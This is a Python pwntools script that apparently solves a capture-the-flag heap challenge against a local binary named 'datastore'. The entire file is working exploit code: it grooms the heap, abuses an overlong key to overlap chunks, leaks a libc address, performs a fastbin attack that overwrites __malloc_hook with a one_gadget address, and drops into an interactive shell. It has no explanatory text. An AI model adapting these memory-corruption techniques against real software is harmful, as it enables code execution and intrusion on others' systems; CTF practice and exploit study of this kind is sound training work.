from pwn import *

context.log_level = 'debug'

io = process('./datastore')
#io = remote('0.0.0.0', 10001)
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def run_cmd(cmd_num):
	io.sendlineafter("command:\n", str(cmd_num))

def put(key, size, data):
	run_cmd('PUT')
	io.sendlineafter("key:\n", key)

	io.sendlineafter("size:\n", str(size))
	io.sendafter("data:\n", data.ljust(size, '\x00'))

def delete(key):
	run_cmd('DEL')
	io.sendlineafter("key:\n", key)

def main():
	for i in range(10):	# avoid complicity
		put(str(i), 0x38, str(i))

	for i in range(10):
		delete(str(i))

	put('1', 0x200, '1')	# allocate what we want in order
	put('2', 0x50, '2')
	put('5', 0x68, '6')
	put('3', 0x1f8, '3')
	put('4', 0xf0, '4')
	put('defense', 0x400, 'defense-data')

	delete('5')	# free those need to be freed
	delete('3')
	delete('1')

	delete('A' * 0x1f0 + p64(0x4e0))

	delete('4')

	put('0x200', 0x200, 'fillup')
	put('0x200 fillup', 0x200, 'fillup again')

def leak_libc():
	global libc_base

	run_cmd('GET')
	io.sendlineafter("key:\n", '2')
	io.recvuntil(" bytes]:\n")
	leak_addr = u64(io.recv(6).ljust(8, '\x00'))
	libc_base = leak_addr - 0x3c4b78
	io.info("leak address: 0x%x" % leak_addr)
	io.info('libc address: 0x%x' % libc_base)

def pwn():
	payload  = "A" * 0x58
	payload += p64(0x71)
	payload += p64(libc_base + libc.symbols['__malloc_hook'] - 0x10 + 5 - 8)
	put('fastatk', 0x100, payload)
	put('prepare', 0x68, 'prepare data')

	one_gadget = libc_base + 0x4526a
	put('attack', 0x68, 'A' * 3 + p64(one_gadget))

	io.sendline('DEL')	# malloc(8) triggers one_gadget

	io.recvuntil("key:\n")
	io.interactive()

main()
leak_libc()
pwn()

